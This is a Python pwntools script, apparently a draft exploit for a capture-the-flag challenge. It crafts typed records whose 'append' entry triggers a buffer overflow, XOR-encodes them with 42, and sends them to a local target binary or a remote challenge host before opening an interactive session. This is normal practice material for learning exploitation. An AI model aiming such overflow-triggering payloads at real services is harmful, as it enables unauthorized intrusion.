#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from random import randrange, seed
import array
import numpy as np
import os
from enum import Enum

class Type(Enum):
	READ_T = 0
	WRITE_T = 1
	APPEND_T = 2
	END_T = 3

def make_obj(type, size = 256, data = b'a' * 256):
	return p32(type.value) + p32(size) + data #+ b'\x00'

def make_read():
	return make_obj(Type.READ_T)

def make_write():
	return make_obj(Type.WRITE_T, 0)

def make_append(): #BOF
	return make_obj(Type.APPEND_T)

def make_end():
	return make_obj(Type.END_T, 0)

def make_data():
	data = make_read()
	data += make_write()
	data += make_append()
	#data += make_append()
	#data += make_append()
	#data += make_append()
	#data += make_append()
	#data += make_append()
	#data += make_append()

	data += make_write()
	data += make_end()
	return data

def memfrob(s):
	return (np.frombuffer(s, dtype=np.uint8) ^ 42).tobytes()

def connect_remote():
	return remote('h4x.0x04.net', 1337)

def connect_test():
	cmd = 'gcc -fstack-protector test.c -o test'
	os.system(cmd)
	return process("./test")

def connect_target():
	return process("./target")	

def send(r, msg):
	r.send(memfrob(msg))

def main():
	#r = connect_remote()
	#r = connect_test()
	r = connect_target()
	msg = make_data()
	print('data', msg)
	send(r, msg)
	r.interactive()

if __name__ == '__main__':
	main()
